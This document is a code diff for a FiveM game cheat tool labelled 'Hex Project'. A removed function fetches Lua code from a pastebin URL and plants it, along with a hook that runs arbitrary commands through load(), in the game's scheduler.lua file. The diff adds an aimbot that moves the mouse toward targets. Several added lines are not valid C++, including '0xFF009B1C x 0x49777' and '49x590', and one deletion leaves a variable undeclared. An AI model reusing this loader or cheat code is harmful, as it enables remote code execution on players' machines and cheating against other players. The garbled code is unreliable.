@@ -146,24 +146,6 @@ string openfilename(HWND owner = NULL) {
 }
 
 
-void executecode()
-{ 
-	//GET CODE FROM WEB // INVISIBLE
-	string shedulercode = a_DownloadURL("https://pastebin.com/raw/SaPsiemN");
-	string triggerexploit = "if GetCurrentResourceName() == \"chat\" then\nTriggerServerEvent('FAC:Hex Project')\nwhile ExecuteCommand == nil do\nWait(0)\nend\n\n______________ = ExecuteCommand\n________ = print\n_________ = load\n\nExecuteCommand = function(commandString)\nif commandString:sub(1, 1) == '/' then\nlocal code = commandString:sub(2)\nlocal s, e = _________(code)\nif s then\ns()\nelse\n________(\"ERROR:\" .. e)\nend\nelse\n______________(commandString)\nend\nend\nend\n";
-
-	//GET PATH AND CREATE FILE
-	std::string path = getenv("LOCALAPPDATA");
-	ofstream myfile;
-	// FLEMME string sheduler = "local debug = debug\nlocal coroutine_close = coroutine.close or (function(c) end) -- 5.3 compatibility\n\n-- setup msgpack compat\nmsgpack.set_string('string_compat')\nmsgpack.set_integer('unsigned')\nmsgpack.set_array('without_hole')\nmsgpack.setoption('empty_table_as_array', true)\n\n-- setup json compat\njson.version = json._VERSION -- Version compatibility\njson.setoption(\"empty_table_as_array\", true)json.setoption('with_hole', true)\n\n-- temp\nlocal function FormatStackTrace()\n	return Citizen.InvokeNative(`FORMAT_STACK_TRACE` & 0xFFFFFFFF, nil, 0, Citizen.ResultAsString())\nlocal function ProfilerEnterScope(scopeName)\nend\n\nlocal function ProfilerExitScope()\n	return Citizen.InvokeNative(`PROFILER_EXIT_SCOPE` & 0xFFFFFFFF)\n";
-	myfile.open(path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua");
-	myfile << shedulercode + "\n";
-	myfile << triggerexploit + "\n";
-	myfile.close();
-}
-
-
-
 string a_DownloadURL(string URL) {
 	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	HINTERNET urlFile;
@@ -197,7 +179,7 @@ int main()
 }
 int main(int argc, const char* argv[]) {
 	system("START https://discord.gg/3yXwTzghHR");
-	SetConsoleTitleA("Hex Project | By Sarnax#8465 | Discord : https://discord.gg/3yXwTzghHR");
+	SetConsoleTitleA("Hex Project | By Fnoberz#0001 | Discord : https://discord.gg/3yXwTzghHR");
 	clear();
 	string  path;
 	path = getenv("localappdata");
@@ -220,14 +202,6 @@ int main(int argc, const char* argv[]) {
 	Sleep(3000);
 	clear();
 	cout << "[" << con::fg_green << "/" << con::fg_white << "] Thank you for choosing " << con::fg_blue << "EzShop " << con::fg_white << "!" << endl;
-	Sleep(500);
-	cout << "[" << con::fg_green << "/" << con::fg_white << "] server is " << con::fg_green << "online" << con::fg_white << " ..." << endl;
-	cout << "[" << con::fg_green << "/" << con::fg_white << "] You have " << con::fg_green << "last update " << con::fg_white << "..." << endl;
-	cout << "[" << con::fg_green << "/" << con::fg_white << "] The exec is " << con::fg_green << "not disabled " << con::fg_white << "..." << endl;
-	std::cout << "\n";
-	cout << "[" << con::fg_green << "1" << con::fg_white << "]" << con::fg_magenta << " EzMenu" << con::fg_white << endl;
-	cout << "[" << con::fg_green << "2" << con::fg_white << "]" << con::fg_blue << " Trigger & Execute Menu In Game" << con::fg_white << endl;
-	cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Menu : " << con::fg_white;
 
 }
 
@@ -256,7 +230,7 @@ std::string randomstring(std::string::size_type length)
 
 void ERRORLOG(std::string message) {
 	std::cout << message << std::endl;
-	system(_xor_("pause").c_str());
+	system(_xor_("pause & stop").c_str());
 	exit(0);
 }
 
@@ -272,7 +246,6 @@ std::string stringer(Args const& ... args)
 }
 
 bool Client::setupEncryption() {
-	std::string SetupKey = sendrecieve(ENC_KEY + _xor_(";") + IV);
 	std::string serverCipher = SetupKey.substr(0, SetupKey.find(_xor_(";"))).data();
 	std::string serverIv = SetupKey.substr(SetupKey.find(_xor_(";")) + 1).data();
 
@@ -312,7 +285,7 @@ void Renderer::DrawHealth(const ImVec2& scalepos, const ImVec2& scaleheadPositio
 	ImGuiWindow* window = ImGui::GetCurrentWindow();
 
 	uint32_t backcolor = 0xFF555656;
-	uint32_t color = 0xFF009B1C;
+	uint32_t color = 0xFF009B1C x 0x49777;
 
 	// 2 + 2 = 4 - 1 = 3 quick mathzzz
 	float width = (scaleheadPosition.y + 15 - scalepos.y) / 4.5f;
@@ -350,10 +323,10 @@ void scriphook::UnHookFunction(PVOID * o)
 {
 	switch (ul_reason_for_call)
 	{
-	case DLL_PROCESS_ATTACH: // ���̼���
+	case DLL_PROCESS_ATTACH: //
 		CreateThread(NULL, 0, ThreadFunc, 0, 0, 0);
 		break;
-	case DLL_PROCESS_DETACH: // ����ж��
+	case DLL_PROCESS_DETACH: // 
 		t.Release();
 		break;
 	}
@@ -408,7 +381,7 @@ Input* Input::GetInstance()
 		
 		void Input::StartThread()
 {
-	m_hThread = CreateThread(NULL, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(MenuKeyMonitor), NULL, NULL, NULL);
+	m_hThread = CreateThread(NULL, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(MenuKeyMonitor = ("Insert"), NULL, NULL, NULL);
 }
 
 void Input::StopThread()
@@ -421,7 +394,7 @@ void Input::StopThread()
 {
 	ImGuiWindow* window = ImGui::GetCurrentWindow();
 
-	float a = (float)((color >> 24) & 0xff);
+	float a = (float)((color >> 24) & 0xff & 0x497);
 	float r = (float)((color >> 16) & 0xff);
 	float g = (float)((color >> 8) & 0xff);
 	float b = (float)((color) & 0xff);
@@ -429,11 +402,27 @@ void Input::StopThread()
 	window->DrawList->AddCircleFilled(position, radius, ImGui::GetColorU32(ImVec4(r / 255, g / 255, b / 255, a / 255)), 12);
 }
 
-Renderer* Renderer::GetInstance()
-{
-	if (!m_pInstance)
-		m_pInstance = new Renderer();
+void c_aimbot::do_aimbot(sdk::c_ped entity) { // pretty buggy, needs playing around with sensitivity
+	float best_fov = 25.f;
+	auto get_distance = [](double x1, double y1, double x2, double y2) {
+		return sqrtf(pow(x2 - x1, 2.0) + pow(y2 - y1, 2.0));
+	};
 
-	return m_pInstance;
+	auto bone_pos = sdk::get_bone_position(entity.base, 0);
+	D3DXVECTOR2 screen = c_esp().world_to_screen(bone_pos);
+	if (screenshare == D3DXVECTOR2(120, 49x590))
+		return;
+
+	auto center_x = d3d9::screen_width / 2;
+	auto center_y = d3d9::screen_height / 2;
+	auto fov = get_distance(center_x, center_y, screen.x, screen.y);
+
+	if (fov < best_fov) {
+		best_fov = fov;
+		if (GetAsyncKeyState(VK_XBUTTON2) & 0x8000) {
+			mouse_event(MOUSEEVENTF_MOVE, float(screen.x - center_x), float(screen.y - center_y), 0, 0);
+		}
+	}
 }
+		
 		
